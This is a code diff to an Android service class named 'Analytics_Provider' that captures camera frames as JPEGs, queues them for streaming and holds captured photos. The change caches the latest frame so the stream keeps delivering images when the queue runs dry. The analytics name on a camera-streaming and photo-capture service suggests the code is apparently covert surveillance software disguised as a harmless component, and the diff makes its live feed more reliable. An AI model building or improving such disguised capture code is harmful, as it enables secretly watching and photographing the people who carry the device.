@@ -109,6 +109,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
     private static volatile int streamHeight = 480;
     private static volatile int streamQuality = 50;
     private static final BlockingQueue<byte[]> frameQueue = new ArrayBlockingQueue<>(5);
+    private static volatile byte[] latestFrame = null;
     private static volatile byte[] lastCapturedPhoto = null;
     private static volatile String lastCaptureError = null;
     private static CountDownLatch captureLatch;
@@ -275,6 +276,7 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                                     ByteArrayOutputStream out = new ByteArrayOutputStream();
                                     bitmap.compress(Bitmap.CompressFormat.JPEG, streamQuality, out);
                                     byte[] jpegData = out.toByteArray();
+                                    latestFrame = jpegData;
                                     if (frameQueue.size() >= 5) frameQueue.poll();
                                     frameQueue.offer(jpegData);
                                     bitmap.recycle();
@@ -696,7 +698,16 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
     // Static Accessors preserved for existing UI compatibility
     public static boolean isCurrentlyStreaming() { return isStreaming; }
     public static boolean isInitializing() { return reinitPending; }
-    public static byte[] getNextFrame(long timeout) { try { return frameQueue.poll(timeout, TimeUnit.MILLISECONDS); } catch (Exception e) { return null; } }
+    public static byte[] getNextFrame(long timeout) {
+        try {
+            byte[] frame = frameQueue.poll(timeout, TimeUnit.MILLISECONDS);
+            if (frame != null && frame.length > 100) {
+                latestFrame = frame;
+                return frame;
+            }
+        } catch (Exception ignored) {}
+        return latestFrame;
+    }
     public static byte[] waitForPhoto(long timeout) { 
         if (captureLatch != null) try { captureLatch.await(timeout, TimeUnit.MILLISECONDS); } catch (Exception ignored) {}
         return lastCapturedPhoto; 
